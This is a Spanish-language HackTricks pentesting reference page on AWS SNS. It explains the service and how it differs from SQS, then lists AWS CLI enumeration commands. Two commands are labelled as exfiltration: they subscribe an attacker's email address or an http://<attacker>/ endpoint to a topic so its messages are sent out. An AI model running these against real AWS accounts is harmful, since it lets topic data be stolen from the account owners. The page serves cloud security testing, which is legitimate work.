# AWS - Enumeraci贸n de SNS

<details>

<summary><strong>隆Apoya a HackTricks y obt茅n beneficios!</strong></summary>

* Si quieres ver tu **empresa anunciada en HackTricks** o si quieres acceder a la **煤ltima versi贸n de PEASS o descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCIN**](https://github.com/sponsors/carlospolop).
* Obt茅n el [**merchandising oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci贸n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **s铆gueme** en **Twitter**  [**@carlospolopm**](https://twitter.com/carlospolopm).

* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github.

</details>

## SNS

Amazon Simple Notification Service (Amazon SNS) es un servicio de mensajer铆a **totalmente administrado** tanto para comunicaci贸n de **aplicaci贸n a aplicaci贸n** (A2A) como de **aplicaci贸n a persona** (A2P).

La funcionalidad de publicaci贸n/suscripci贸n A2A proporciona **temas** para la mensajer铆a de **muchos a muchos**, basada en **empuje** y de alto rendimiento entre sistemas distribuidos, microservicios y aplicaciones sin servidor basadas en eventos. Utilizando los temas de Amazon SNS, tus sistemas de publicaci贸n pueden difundir mensajes a un **gran n煤mero de sistemas suscriptores**.

### **Diferencia con SQS**

**SQS** es un servicio basado en **colas** que permite la comunicaci贸n punto a punto, asegurando que los mensajes sean procesados por un **煤nico consumidor**. Ofrece **entrega al menos una vez**, admite colas est谩ndar y FIFO, y permite la retenci贸n de mensajes para reintentos y procesamiento retardado.\
Por otro lado, **SNS** es un servicio basado en **publicaci贸n/suscripci贸n**, que permite la comunicaci贸n de **uno a muchos** al transmitir mensajes a **m煤ltiples suscriptores** simult谩neamente. Admite **varios puntos finales de suscripci贸n como correo electr贸nico, SMS, funciones Lambda y HTTP/HTTPS**, y proporciona mecanismos de filtrado para la entrega dirigida de mensajes.\
Si bien ambos servicios permiten el desacoplamiento entre componentes en sistemas distribuidos, SQS se centra en la comunicaci贸n en cola, mientras que SNS enfatiza los patrones de comunicaci贸n basados en eventos y difusi贸n.

### **Enumeraci贸n**
```bash
# Get topics & subscriptions
aws sns list-topics
aws sns list-subscriptions
aws sns list-subscriptions-by-topic --topic-arn <arn>

# Check privescs & post-exploitation
aws sns publish --region <region> \
--topic-arn "arn:aws:sns:us-west-2:123456789012:my-topic" \
--message file://message.txt

# Exfiltrate through email
## You will receive an email to confirm the subscription
aws sns subscribe --region <region> \
--topic-arn arn:aws:sns:us-west-2:123456789012:my-topic \
--protocol email \
--notification-endpoint my-email@example.com

# Exfiltrate through web server
## You will receive an initial request with a URL in the field "SubscribeURL"
## that you need to access to confirm the subscription
aws sns subscribe --region <region>\
--protocol http \
--notification-endpoint http://<attacker>/ \
--topic-arn <arn>
```
{% hint style="danger" %}
Ten en cuenta que si el **tema es de tipo FIFO**, solo se pueden utilizar suscriptores que utilicen el protocolo **SQS** (no se puede utilizar HTTP o HTTPS).

Adem谩s, aunque el `--topic-arn` contenga la regi贸n, aseg煤rate de especificar la regi贸n correcta en **`--region`** o recibir谩s un error que parece indicar que no tienes acceso, pero el problema es la regi贸n.
{% endhint %}

### Acceso no autenticado

{% content-ref url="../aws-unauthenticated-enum-access/aws-sns-unauthenticated-enum.md" %}
[aws-sns-unauthenticated-enum.md](../aws-unauthenticated-enum-access/aws-sns-unauthenticated-enum.md)
{% endcontent-ref %}

### Escalada de privilegios

{% content-ref url="../aws-privilege-escalation/aws-sns-privesc.md" %}
[aws-sns-privesc.md](../aws-privilege-escalation/aws-sns-privesc.md)
{% endcontent-ref %}

### Post Explotaci贸n

{% content-ref url="../aws-post-exploitation/aws-sns-post-exploitation.md" %}
[aws-sns-post-exploitation.md](../aws-post-exploitation/aws-sns-post-exploitation.md)
{% endcontent-ref %}

### Persistencia

{% content-ref url="../aws-persistence/aws-sns-persistence.md" %}
[aws-sns-persistence.md](../aws-persistence/aws-sns-persistence.md)
{% endcontent-ref %}

<details>

<summary><strong>隆Apoya a HackTricks y obt茅n beneficios!</strong></summary>

* Si quieres ver tu **empresa anunciada en HackTricks** o si quieres acceder a la **煤ltima versi贸n de PEASS o descargar HackTricks en PDF**, 隆consulta los [**PLANES DE SUSCRIPCIN**](https://github.com/sponsors/carlospolop)!
* Obt茅n el [**merchandising oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci贸n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **s铆gueme** en **Twitter**  [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
